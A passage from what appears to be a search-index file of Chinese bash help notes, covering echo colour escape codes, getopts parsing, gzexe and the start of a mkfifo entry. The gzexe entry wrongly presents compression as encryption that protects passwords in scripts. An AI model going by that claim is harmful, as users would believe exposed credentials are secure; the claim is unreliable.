\u7684\u989c\u8272\u8f93\u51fa \u683c\u5f0f\u5982\u4e0b: \u200b echo -e \"\\033[\u5b57\u80cc\u666f\u989c\u8272;\u6587\u5b57\u989c\u8272m\u5b57\u7b26\u4e32\\033[0m\"\uff0c\u9700\u8981\u4f7f\u7528\u53c2\u6570-e \u9009\u9879\u53ef\u4ee5\u53e0\u52a0\uff0c\u4e2d\u95f4\u7528\u5206\u53f7\u9694\u5f00 m\u4e00\u5b9a\u5728\u9009\u9879\u7684\u6700\u540e\uff0c\u6bd4\u5982\u3001033[41;37;5m\u8bbe\u7f6e\u7ea2\u5e95\u767d\u5b57\u95ea\u70c1 \u5b57\u7b26\u4e32\u524d\u540e\u53ef\u4ee5\u6ca1\u6709\u7a7a\u683c\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u8f93\u51fa\u4e5f\u662f\u540c\u6837\u6709\u7a7a\u683c \u5b57\u7b26\u4e32\u7ed3\u675f\u4e00\u5b9a\u8981\u52a0\u5173\u95ed\u6240\u6709\u5c5e\u6027:033[0m\u6216\u8005\\e[0m\uff0c\u5426\u5219\u4e0b\u9762\u7684\u8f93\u5165\u90fd\u4f1a\u53d8\u8272 \u53ef\u4ee5\u5d4c\u5957\uff0c\u7c7b\u4f3cxml\u5d4c\u5957\uff0c\u7f51\u9875\u7684\u4e66\u5199\u89c4\u5219\uff0c\u5f00\u5934\u53ef\u4ee5\u52a0\u5404\u79cd\u5c5e\u6027\uff0c\u7ed3\u675f\u5fc5\u987b\u6e05\u9664\u89c4\u5219 echo\u540e\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u5c3d\u91cf\u8981\u52a0\u5f15\u53f7\uff0c\u6bd4\u5982echo -e \"\\033[31;47;5m kjdfasdf \\033[0m\"\uff0c\u767d\u5e95\u7ea2\u5b57\u95ea\u70c1 \u672c\u8d28\u4e0a\u662f\u663e\u793aansi\u7684\u8f6c\u4e49\u5e8f\u5217\uff0c ANSI\u8f6c\u4e49\u5e8f\u5217 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u8f6c\u4e49\u5b57\u7b26 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u4e0b\u9762\u770b\u51e0\u4e2a\u4f8b\u5b50\uff1a #30m=\u9ed1\u8272\uff0c 31m=\u7ea2\u8272\uff0c 32m=\u7eff\u8272\uff0c 33m=\u9ec4\u8272 #34m=\u84dd\u8272\uff0c 35m=\u6d0b\u7ea2\uff0c 36m=\u9752\u8272\uff0c 37m=\u767d\u8272 [root@localhost ~]# echo -e \"\\e[1;31m 1234 \\e[0m\" \u8f93\u51fa\u7ea2\u8272\u76841234 #\u5c3d\u91cf\u5e26\"\"\u53f7 \u7ea2\u5e95\u767d\u7c97\u4f53\u5b57 echo -e \"\\033[1;41;37m \u7ea2\u5e95\u767d\u5b57 \\033[0m\" \u7eff\u5e95\u767d\u7c97\u4f53\u5b57 echo -e \"\\033[1;42;37m \u7eff\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[30m \u9ed1\u8272\u5b57 \\033[0m\" echo -e \"\\033[31m \u7ea2\u8272\u5b57 \\033[0m\" echo -e \"\\033[32m \u7eff\u8272\u5b57 \\033[0m\" echo -e \"\\033[33m \u9ec4\u8272\u5b57 \\033[0m\" echo -e \"\\033[34m \u84dd\u8272\u5b57 \\033[0m\" echo -e \"\\033[35m \u7d2b\u8272\u5b57 \\033[0m\" echo -e \"\\033[36m \u5929\u84dd\u5b57 \\033[0m\" echo -e \"\\033[37m \u767d\u8272\u5b57 \\033[0m\" echo -e \"\\033[40;37m \u9ed1\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[41;37m \u7ea2\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[42;37m \u7eff\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[43;37m \u9ec4\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[44;37m \u84dd\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[45;37m \u7d2b\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[46;37m \u5929\u84dd\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[47;30m \u767d\u5e95\u9ed1\u5b57 \\033[0m\" \u63a7\u5236\u9009\u9879\u8bf4\u660e \uff1a \\033\u53ef\u4ee5\u6362\u6210\\e \\033[0m\uff0c\\e[0m\u5173\u95ed\u6240\u6709\u5c5e\u6027 \\033[1m \u8bbe\u7f6e\u9ad8\u4eae\u5ea6\uff0c\u5b57\u4f53\u662f\u7c97\u4f53 \\033[4m \u4e0b\u5212\u7ebf \\033[5m \u95ea\u70c1 \\033[7m \u53cd\u663e \\033[8m \u6d88\u9690 \\033[30m -- \\33[37m \u8bbe\u7f6e\u524d\u666f\u8272 \\033[40m -- \\33[47m \u8bbe\u7f6e\u80cc\u666f\u8272 \\033[nA \u5149\u6807\u4e0a\u79fbn\u884c \\033[nB \u5149\u6807\u4e0b\u79fbn\u884c \\033[nC \u5149\u6807\u53f3\u79fbn\u884c \\033[nD \u5149\u6807\u5de6\u79fbn\u884c \\033[y;xH\u8bbe\u7f6e\u5149\u6807\u4f4d\u7f6e \\033[2J \u6e05\u5c4f \\033[K \u6e05\u9664\u4ece\u5149\u6807\u5230\u884c\u5c3e\u7684\u5185\u5bb9 \\033[s \u4fdd\u5b58\u5149\u6807\u4f4d\u7f6e \\033[u \u6062\u590d\u5149\u6807\u4f4d\u7f6e \\033[?25l \u9690\u85cf\u5149\u6807 \\033[?25h \u663e\u793a\u5149\u6807 \u62d3\u5c55\uff1a \u6280\u672f|\u5982\u4f55\u6539\u53d8\u4f60\u7684\u7ec8\u7aef\u989c\u8272 (linux.cn)","title":"bash\u7684\u989c\u8272\u63a7\u5236"},{"location":"programming_language/bash_help/echo/#echo","text":"","title":"echo"},{"location":"programming_language/bash_help/echo/#_1","text":"\u200b echo [\u9009\u9879] [\u8f93\u51fa\u5185\u5bb9] \u9009\u9879\uff1a -e\uff1a \u652f\u6301\u53cd\u659c\u7ebf\u63a7\u5236\u7684\u5b57\u7b26\u8f6c\u6362 \u200b -n : \u4e0d\u6362\u884c\u8f93\u51fa \\\\ \u8f93\u51fa\\\u672c\u8eab \\a \u8f93\u51fa\u8b66\u544a\u97f3 \\007\u8f93\u51fa\u8b66\u544a\u97f3\uff0c\u8b66\u544a\u97f3\u53ef\u4ee5\u548csleep\u914d\u5408 \\b \u9000\u683c\u952e\uff0c\u4e5f\u5c31\u662f\u5411\u5de6\u5220\u9664\u952e \\c \u53d6\u6d88\u8f93\u51fa\u884c\u672b\u7684\u6362\u884c\u7b26\u3002\u548c\u201c-n\u201d\u9009\u9879\u4e00\u81f4 \\e ESCAPE\u952e \u5c31\u662fesc\u952e\u5b50 \\033 ESCAPE\u952e \\f \u6362\u9875\u7b26 \\n \u6362\u884c\u7b26 \\r \u56de\u8f66\u952e \\t \u5236\u8868\u7b26\uff0c\u4e5f\u5c31\u662fTab\u952e \\v \u5782\u76f4\u5236\u8868\u7b26 \\0nnn \u6309\u7167\u516b\u8fdb\u5236ASCII\u7801\u8868\u8f93\u51fa\u5b57\u7b26\u3002\u5176\u4e2d0\u4e3a\u6570\u5b57\u96f6\uff0cnnn\u662f\u4e09\u4f4d\u516b\u8fdb\u5236\u6570 \\xhh \u6309\u7167\u5341\u516d\u8fdb\u5236ASCII\u7801\u8868\u8f93\u51fa\u5b57\u7b26\u3002\u5176\u4e2dhh\u662f\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u6570 \\e[1; \u5f00\u542f\u989c\u8272 \\e[0m \u5173\u95ed\u989c\u8272","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/echo/#echo_1","text":"\u683c\u5f0f\u5982\u4e0b: \u200b echo -e \"\\033[\u5b57\u80cc\u666f\u989c\u8272;\u6587\u5b57\u989c\u8272m\u5b57\u7b26\u4e32\\033[0m\"\uff0c\u9700\u8981\u4f7f\u7528\u53c2\u6570-e \u9009\u9879\u53ef\u4ee5\u53e0\u52a0\uff0c\u4e2d\u95f4\u7528\u5206\u53f7\u9694\u5f00 m\u4e00\u5b9a\u5728\u9009\u9879\u7684\u6700\u540e\uff0c\u6bd4\u5982\u3001033[41;37;5m\u8bbe\u7f6e\u7ea2\u5e95\u767d\u5b57\u95ea\u70c1 \u5b57\u7b26\u4e32\u524d\u540e\u53ef\u4ee5\u6ca1\u6709\u7a7a\u683c\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u8f93\u51fa\u4e5f\u662f\u540c\u6837\u6709\u7a7a\u683c \u5b57\u7b26\u4e32\u7ed3\u675f\u4e00\u5b9a\u8981\u52a0\u5173\u95ed\u6240\u6709\u5c5e\u6027:033[0m\u6216\u8005\\e[0m\uff0c\u5426\u5219\u4e0b\u9762\u7684\u8f93\u5165\u90fd\u4f1a\u53d8\u8272 \u53ef\u4ee5\u5d4c\u5957\uff0c\u7c7b\u4f3cxml\u5d4c\u5957\uff0c\u7f51\u9875\u7684\u4e66\u5199\u89c4\u5219\uff0c\u5f00\u5934\u53ef\u4ee5\u52a0\u5404\u79cd\u5c5e\u6027\uff0c\u7ed3\u675f\u5fc5\u987b\u6e05\u9664\u89c4\u5219 echo\u540e\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u5c3d\u91cf\u8981\u52a0\u5f15\u53f7\uff0c\u6bd4\u5982echo -e \"\\033[31;47;5m kjdfasdf \\033[0m\"\uff0c\u767d\u5e95\u7ea2\u5b57\u95ea\u70c1 \u672c\u8d28\u4e0a\u662f\u663e\u793aansi\u7684\u8f6c\u4e49\u5e8f\u5217\uff0c ANSI\u8f6c\u4e49\u5e8f\u5217 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u8f6c\u4e49\u5b57\u7b26 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u4e0b\u9762\u770b\u51e0\u4e2a\u4f8b\u5b50\uff1a #30m=\u9ed1\u8272\uff0c 31m=\u7ea2\u8272\uff0c 32m=\u7eff\u8272\uff0c 33m=\u9ec4\u8272 #34m=\u84dd\u8272\uff0c 35m=\u6d0b\u7ea2\uff0c 36m=\u9752\u8272\uff0c 37m=\u767d\u8272 [root@localhost ~]# echo -e \"\\e[1;31m 1234 \\e[0m\" \u8f93\u51fa\u7ea2\u8272\u76841234 #\u5c3d\u91cf\u5e26\"\"\u53f7 \u7ea2\u5e95\u767d\u7c97\u4f53\u5b57 echo -e \"\\033[1;41;37m \u7ea2\u5e95\u767d\u5b57 \\033[0m\" \u7eff\u5e95\u767d\u7c97\u4f53\u5b57 echo -e \"\\033[1;42;37m \u7eff\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[30m \u9ed1\u8272\u5b57 \\033[0m\" echo -e \"\\033[31m \u7ea2\u8272\u5b57 \\033[0m\" echo -e \"\\033[32m \u7eff\u8272\u5b57 \\033[0m\" echo -e \"\\033[33m \u9ec4\u8272\u5b57 \\033[0m\" echo -e \"\\033[34m \u84dd\u8272\u5b57 \\033[0m\" echo -e \"\\033[35m \u7d2b\u8272\u5b57 \\033[0m\" echo -e \"\\033[36m \u5929\u84dd\u5b57 \\033[0m\" echo -e \"\\033[37m \u767d\u8272\u5b57 \\033[0m\" echo -e \"\\033[40;37m \u9ed1\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[41;37m \u7ea2\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[42;37m \u7eff\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[43;37m \u9ec4\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[44;37m \u84dd\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[45;37m \u7d2b\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[46;37m \u5929\u84dd\u5e95\u767d\u5b57 \\033[0m\" echo -e \"\\033[47;30m \u767d\u5e95\u9ed1\u5b57 \\033[0m\" \u63a7\u5236\u9009\u9879\u8bf4\u660e \uff1a \\033\u53ef\u4ee5\u6362\u6210\\e \\033[0m\uff0c\\e[0m\u5173\u95ed\u6240\u6709\u5c5e\u6027 \\033[1m \u8bbe\u7f6e\u9ad8\u4eae\u5ea6\uff0c\u5b57\u4f53\u662f\u7c97\u4f53 \\033[4m \u4e0b\u5212\u7ebf \\033[5m \u95ea\u70c1 \\033[7m \u53cd\u663e \\033[8m \u6d88\u9690 \\033[30m -- \\33[37m \u8bbe\u7f6e\u524d\u666f\u8272 \\033[40m -- \\33[47m \u8bbe\u7f6e\u80cc\u666f\u8272 \\033[nA \u5149\u6807\u4e0a\u79fbn\u884c \\033[nB \u5149\u6807\u4e0b\u79fbn\u884c \\033[nC \u5149\u6807\u53f3\u79fbn\u884c \\033[nD \u5149\u6807\u5de6\u79fbn\u884c \\033[y;xH\u8bbe\u7f6e\u5149\u6807\u4f4d\u7f6e \\033[2J \u6e05\u5c4f \\033[K \u6e05\u9664\u4ece\u5149\u6807\u5230\u884c\u5c3e\u7684\u5185\u5bb9 \\033[s \u4fdd\u5b58\u5149\u6807\u4f4d\u7f6e \\033[u \u6062\u590d\u5149\u6807\u4f4d\u7f6e \\033[?25l \u9690\u85cf\u5149\u6807 \\033[?25h \u663e\u793a\u5149\u6807 \u62d3\u5c55\uff1a \u6280\u672f|\u5982\u4f55\u6539\u53d8\u4f60\u7684\u7ec8\u7aef\u989c\u8272 (linux.cn)","title":"echo \u7684\u989c\u8272\u8f93\u51fa"},{"location":"programming_language/bash_help/getops/","text":"getopts getopts \u662f\u4e00\u4e2a \u5185\u7f6e\u7684 Unix shell \u547d\u4ee4\uff0c\u7528\u4e8e\u89e3\u6790 \u547d\u4ee4\u884c\u53c2\u6570 \u3002\u5b83\u65e8\u5728\u5904\u7406\u9075\u5faa POSIX \u5b9e\u7528\u7a0b\u5e8f\u8bed\u6cd5\u51c6\u5219\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u57fa\u4e8e getopt \u7684 C \u63a5\u53e3\u3002\u5176\u524d\u8eab\u662f Unix System Laboratories \u7684\u5916\u90e8\u7a0b\u5e8f getopt \u3002 \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f \uff1agetopts optstring name [arg...] \u4f8b\u5b50\uff1a #!/bin/bash # getopts-test.sh while getopts dc:s: o do case \"$o\" in d) echo \"d option value is $OPTARG\" echo \"d option index is $(($OPTIND-1))\" ;; c) echo \"c option value is $OPTARG\" ;; s) echo \"s option... $OPTARG\" echo \"s option index is $(($OPTIND-1))\" ;; '?') echo \"Usage: $0 [-s] [-d value] file ...\" ;; esac done while getopts dc:s: o \u6b64\u53e5\u8bdd\u610f\u601d\u4e3a \u6bd4\u5982\uff0cdc:s: \u8868\u793ac\u53c2\u6570\u540e\u9762\u4f1a\u6709\u4e00\u4e2a\u503c\u51fa\u73b0\uff0c-c value\u7684\u5f62\u5f0f \u8868\u793as\u53c2\u6570\u540e\u9762\u4f1a\u6709\u4e00\u4e2a\u503c\u51fa\u73b0\uff0c-s value\u7684\u5f62\u5f0f \u4f8b\u5982 \u6240\u6709\u7684\u9009\u9879\u90fd\u662f\u975e\u5fc5\u987b\u7684 \u4f8b\u5982 c\u540e\u9762\u7684: \u4ee3\u8868 -c \u9700\u8981\u8ddf\u7740 value OPTARG\u53d8\u91cf\u4ee3\u8868value\u503c $(($OPTIND-1))\u4ee3\u8868\u8fd9\u4e2avalue\u5728\u8f93\u5165\u7684\u7b2c\u51e0\u4e2a\u4f4d\u7f6e\u4e0a d\u540e\u9762\u6ca1\u6709\uff1a \u5219\u4ee3\u8868-d \u540e\u9762\u4e0d\u80fd\u52a0value \u8f93\u5165\u683c\u5f0f\u6ca1\u6709\u5148\u540e\u987a\u5e8f \u4f46\u662f\u6ca1\u6709value\u503c\u7684 \u6dfb\u52a0\u4e86value\u503c\u5bfc\u81f4\u540e\u9762\u7684\u53c2\u6570\u5c31\u65e0\u6cd5\u8bc6\u522b \u4f8b\u5982 while getopts :dc:s: o \u5982\u679c\u5f00\u5934\u6709\u5192\u53f7 \u4ee3\u8868\u5ffd\u7565\u62a5\u9519 \u6b63\u5e38\u65e0\u5192\u53f7 \u6dfb\u52a0\u5f00\u5934\u5192\u53f7\u540e case\u91cc\u9762\u7684 \u6700\u540e\u7684 ? \u53ef\u4ee5\u66ff\u6362\u6210 * \u548c [?]","title":"bashm\u811a\u672c\u547d\u4ee4\u884c\u9009\u9879"},{"location":"programming_language/bash_help/getops/#getopts","text":"getopts \u662f\u4e00\u4e2a \u5185\u7f6e\u7684 Unix shell \u547d\u4ee4\uff0c\u7528\u4e8e\u89e3\u6790 \u547d\u4ee4\u884c\u53c2\u6570 \u3002\u5b83\u65e8\u5728\u5904\u7406\u9075\u5faa POSIX \u5b9e\u7528\u7a0b\u5e8f\u8bed\u6cd5\u51c6\u5219\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u57fa\u4e8e getopt \u7684 C \u63a5\u53e3\u3002\u5176\u524d\u8eab\u662f Unix System Laboratories \u7684\u5916\u90e8\u7a0b\u5e8f getopt \u3002","title":"getopts"},{"location":"programming_language/bash_help/getops/#_1","text":"\u8bed\u6cd5\u683c\u5f0f \uff1agetopts optstring name [arg...] \u4f8b\u5b50\uff1a #!/bin/bash # getopts-test.sh while getopts dc:s: o do case \"$o\" in d) echo \"d option value is $OPTARG\" echo \"d option index is $(($OPTIND-1))\" ;; c) echo \"c option value is $OPTARG\" ;; s) echo \"s option... $OPTARG\" echo \"s option index is $(($OPTIND-1))\" ;; '?') echo \"Usage: $0 [-s] [-d value] file ...\" ;; esac done while getopts dc:s: o \u6b64\u53e5\u8bdd\u610f\u601d\u4e3a \u6bd4\u5982\uff0cdc:s: \u8868\u793ac\u53c2\u6570\u540e\u9762\u4f1a\u6709\u4e00\u4e2a\u503c\u51fa\u73b0\uff0c-c value\u7684\u5f62\u5f0f \u8868\u793as\u53c2\u6570\u540e\u9762\u4f1a\u6709\u4e00\u4e2a\u503c\u51fa\u73b0\uff0c-s value\u7684\u5f62\u5f0f \u4f8b\u5982 \u6240\u6709\u7684\u9009\u9879\u90fd\u662f\u975e\u5fc5\u987b\u7684 \u4f8b\u5982 c\u540e\u9762\u7684: \u4ee3\u8868 -c \u9700\u8981\u8ddf\u7740 value OPTARG\u53d8\u91cf\u4ee3\u8868value\u503c $(($OPTIND-1))\u4ee3\u8868\u8fd9\u4e2avalue\u5728\u8f93\u5165\u7684\u7b2c\u51e0\u4e2a\u4f4d\u7f6e\u4e0a d\u540e\u9762\u6ca1\u6709\uff1a \u5219\u4ee3\u8868-d \u540e\u9762\u4e0d\u80fd\u52a0value \u8f93\u5165\u683c\u5f0f\u6ca1\u6709\u5148\u540e\u987a\u5e8f \u4f46\u662f\u6ca1\u6709value\u503c\u7684 \u6dfb\u52a0\u4e86value\u503c\u5bfc\u81f4\u540e\u9762\u7684\u53c2\u6570\u5c31\u65e0\u6cd5\u8bc6\u522b \u4f8b\u5982 while getopts :dc:s: o \u5982\u679c\u5f00\u5934\u6709\u5192\u53f7 \u4ee3\u8868\u5ffd\u7565\u62a5\u9519 \u6b63\u5e38\u65e0\u5192\u53f7 \u6dfb\u52a0\u5f00\u5934\u5192\u53f7\u540e case\u91cc\u9762\u7684 \u6700\u540e\u7684 ? \u53ef\u4ee5\u66ff\u6362\u6210 * \u548c [?]","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/gzexe/","text":"gzexe \u4e00\u3001 \u7b80\u4ecb \u5f88\u591a\u65f6\u5019\u6211\u4eec\u7684\u811a\u672c\u4f1a\u6d89\u53ca\u5230\u4e00\u4e9b\u79c1\u5bc6\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u6216\u8005\u5176\u5b83\u91cd\u8981\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f7f\u7528\u4e00\u4e9b\u52a0\u5bc6\u7684\u624b\u6bb5\u6765\u5c4f\u853d\u8fd9\u4e9b\u4fe1\u606f\uff0c\u786e\u4fdd\u7cfb\u7edf\u7684\u5b89\u5168\u5df2\u7ecf\u811a\u672c\u7684\u53ef\u6d41\u4f20\u6027\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u7cfb\u7edf\u81ea\u5e26\u7684gzexe\u8fd9\u4e2a\u5de5\u5177\u5c31\u591f\u4e86\u3002 \u8bed\u6cd5 \u52a0\u5bc6\uff1a \u8bed\u6cd5\u683c\u5f0f \uff1agzexe [\u6587\u4ef6] \u89e3\u5bc6\uff1a \u8bed\u6cd5\u683c\u5f0f \uff1agzexe -d [\u6587\u4ef6] \u5b9e\u4f8b 1 \u7f16\u5199\u4e00\u4e2a\u7528\u4e8e\u6d4b\u8bd5\u7684\u811a\u672c [root@woo ~]# vi woo.sh #! /bin/ksh echo 'PrudentWoo'' '`date +%Y-%m-%d' '%T` uptime 2 \u8d4b\u4e88\u53ef\u6267\u884c\u6743\u9650\uff0c\u5e76\u6267\u884c [root@woo ~]# chmod +x woo.sh [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:13:27 22:13:27 up 10 days, 23:03, 3 users, load average: 0.00, 0.01, 0.05 3 \u6267\u884cgzexe\u52a0\u5bc6\u64cd\u4f5c [root@woo ~]# gzexe woo.sh woo.sh: 11.5% [root@woo ~]# ll woo.s* -rwxr-xr-x 1 root root 888 Dec 30 22:15 woo.sh -rwxr-xr-x 1 root root 61 Dec 30 22:11 woo.sh~ [root@woo ~]# 4 \u52a0\u5bc6\u540e\u7684\u6587\u4ef6\u5185\u5bb9 [root@woo ~]# strings woo.sh #!/bin/sh skip=44 tab=' ' nl=' IFS=\" $tab$nl\" umask=`umask` umask 77 gztmpdir= trap 'res=$? test -n \"$gztmpdir\" && rm -fr \"$gztmpdir\" (exit $res); exit $res ' 0 1 2 3 5 10 13 15 if type mktemp >/dev/null 2>&1; then gztmpdir=`mktemp -dt` else gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir fi || { (exit 127); exit 127; } gztmp=$gztmpdir/$0 case $0 in -* | */*' ') mkdir -p \"$gztmp\" && rm -r \"$gztmp\";; */*) gztmp=$gztmpdir/`basename \"$0\"`;; esac || { (exit 127); exit 127; } case `echo X | tail -n +1 2>/dev/null` in X) tail_n=-n;; *) tail_n=;; esac if tail $tail_n +$skip <\"$0\" | gzip -cd > \"$gztmp\"; then umask $umask chmod 700 \"$gztmp\" (sleep 5; rm -fr \"$gztmpdir\") 2>/dev/null & \"$gztmp\" ${1+\"$@\"}; res=$? else echo >&2 \"Cannot decompress $0\" (exit 127); res=127 fi; exit $res woo.sh (*MI WWWPOHI,IU 5 \u518d\u6b21\u6267\u884c\u52a0\u5bc6\u540e\u7684\u6587\u4ef6,\u8f93\u51fa\u7ed3\u679c\u4e00\u6837 [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:17:22 22:17:22 up 10 days, 23:06, 3 users, load average: 0.00, 0.01, 0.05 [root@woo ~]# 6 \u6267\u884c\u89e3\u5bc6\u64cd\u4f5c\uff1a [root@woo ~]# gzexe -d woo.sh [root@woo ~]# cat woo.sh #! /bin/ksh echo 'PrudentWoo'' '`date +%Y-%m-%d' '%T` uptime [root@woo ~]# 7 \u518d\u6b21\u6267\u884c\u786e\u8ba4\uff0c\u52a0\u5bc6\u89e3\u5bc6\u90fd\u662f\u53ef\u884c\u7684\uff1a [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:19:50 22:19:50 up 10 days, 23:09, 3 users, load average: 0.00, 0.01, 0.05 [root@woo ~]#","title":"bash\u811a\u672c\u52a0\u5bc6"},{"location":"programming_language/bash_help/gzexe/#gzexe","text":"\u4e00\u3001 \u7b80\u4ecb \u5f88\u591a\u65f6\u5019\u6211\u4eec\u7684\u811a\u672c\u4f1a\u6d89\u53ca\u5230\u4e00\u4e9b\u79c1\u5bc6\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u6216\u8005\u5176\u5b83\u91cd\u8981\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f7f\u7528\u4e00\u4e9b\u52a0\u5bc6\u7684\u624b\u6bb5\u6765\u5c4f\u853d\u8fd9\u4e9b\u4fe1\u606f\uff0c\u786e\u4fdd\u7cfb\u7edf\u7684\u5b89\u5168\u5df2\u7ecf\u811a\u672c\u7684\u53ef\u6d41\u4f20\u6027\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u7cfb\u7edf\u81ea\u5e26\u7684gzexe\u8fd9\u4e2a\u5de5\u5177\u5c31\u591f\u4e86\u3002","title":"gzexe"},{"location":"programming_language/bash_help/gzexe/#_1","text":"\u52a0\u5bc6\uff1a \u8bed\u6cd5\u683c\u5f0f \uff1agzexe [\u6587\u4ef6] \u89e3\u5bc6\uff1a \u8bed\u6cd5\u683c\u5f0f \uff1agzexe -d [\u6587\u4ef6]","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/gzexe/#_2","text":"1 \u7f16\u5199\u4e00\u4e2a\u7528\u4e8e\u6d4b\u8bd5\u7684\u811a\u672c [root@woo ~]# vi woo.sh #! /bin/ksh echo 'PrudentWoo'' '`date +%Y-%m-%d' '%T` uptime 2 \u8d4b\u4e88\u53ef\u6267\u884c\u6743\u9650\uff0c\u5e76\u6267\u884c [root@woo ~]# chmod +x woo.sh [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:13:27 22:13:27 up 10 days, 23:03, 3 users, load average: 0.00, 0.01, 0.05 3 \u6267\u884cgzexe\u52a0\u5bc6\u64cd\u4f5c [root@woo ~]# gzexe woo.sh woo.sh: 11.5% [root@woo ~]# ll woo.s* -rwxr-xr-x 1 root root 888 Dec 30 22:15 woo.sh -rwxr-xr-x 1 root root 61 Dec 30 22:11 woo.sh~ [root@woo ~]# 4 \u52a0\u5bc6\u540e\u7684\u6587\u4ef6\u5185\u5bb9 [root@woo ~]# strings woo.sh #!/bin/sh skip=44 tab=' ' nl=' IFS=\" $tab$nl\" umask=`umask` umask 77 gztmpdir= trap 'res=$? test -n \"$gztmpdir\" && rm -fr \"$gztmpdir\" (exit $res); exit $res ' 0 1 2 3 5 10 13 15 if type mktemp >/dev/null 2>&1; then gztmpdir=`mktemp -dt` else gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir fi || { (exit 127); exit 127; } gztmp=$gztmpdir/$0 case $0 in -* | */*' ') mkdir -p \"$gztmp\" && rm -r \"$gztmp\";; */*) gztmp=$gztmpdir/`basename \"$0\"`;; esac || { (exit 127); exit 127; } case `echo X | tail -n +1 2>/dev/null` in X) tail_n=-n;; *) tail_n=;; esac if tail $tail_n +$skip <\"$0\" | gzip -cd > \"$gztmp\"; then umask $umask chmod 700 \"$gztmp\" (sleep 5; rm -fr \"$gztmpdir\") 2>/dev/null & \"$gztmp\" ${1+\"$@\"}; res=$? else echo >&2 \"Cannot decompress $0\" (exit 127); res=127 fi; exit $res woo.sh (*MI WWWPOHI,IU 5 \u518d\u6b21\u6267\u884c\u52a0\u5bc6\u540e\u7684\u6587\u4ef6,\u8f93\u51fa\u7ed3\u679c\u4e00\u6837 [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:17:22 22:17:22 up 10 days, 23:06, 3 users, load average: 0.00, 0.01, 0.05 [root@woo ~]# 6 \u6267\u884c\u89e3\u5bc6\u64cd\u4f5c\uff1a [root@woo ~]# gzexe -d woo.sh [root@woo ~]# cat woo.sh #! /bin/ksh echo 'PrudentWoo'' '`date +%Y-%m-%d' '%T` uptime [root@woo ~]# 7 \u518d\u6b21\u6267\u884c\u786e\u8ba4\uff0c\u52a0\u5bc6\u89e3\u5bc6\u90fd\u662f\u53ef\u884c\u7684\uff1a [root@woo ~]# ./woo.sh PrudentWoo 2014-12-30 22:19:50 22:19:50 up 10 days, 23:09, 3 users, load average: 0.00, 0.01, 0.05 [root@woo ~]#","title":"\u5b9e\u4f8b"},{"location":"programming_language/bash_help/mkfifo/","text":"Mkfifo \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f\uff1a mkfifo [\u53c2\u6570] [\u540d\u79f0] \u5e38\u7528\u53c2\u6570\uff1a -m <\u6a21\u5f0f> \u8bbe\u7f6e\u6743\u9650\u6a21\u5f0f\uff0c\u7c7b\u4f3cchmod -Z \u5c06\u6bcf\u4e2a\u521b\u5efa\u7684\u76ee\u5f55SELinux\u5b89\u5168\u73af\u5883\u8bbe\u7f6e\u4e3aCTX \u53c2\u8003\u5b9e\u4f8b \u521b\u5efaFIFO\u6587\u4ef6 /root/fifo\uff1a [root@linuxcool ~]# mkfifo /root/fifo \u7528mkfifo\u63a7\u5236\u5b50shell\u6570\u91cf \u9700\u6c42\uff1a\u5e76\u53d1\u68c0\u6d4b1000\u53f0web\u670d\u52a1\u5668\u72b6\u6001\uff08\u6216\u8005\u5e76\u53d1\u4e3a1000\u53f0web\u670d\u52a1\u5668\u5206\u53d1\u6587\u4ef6\u7b49\uff09\u5982\u4f55\u7528shell\u5b9e\u73b0\uff1f \u65b9\u6848\u4e00 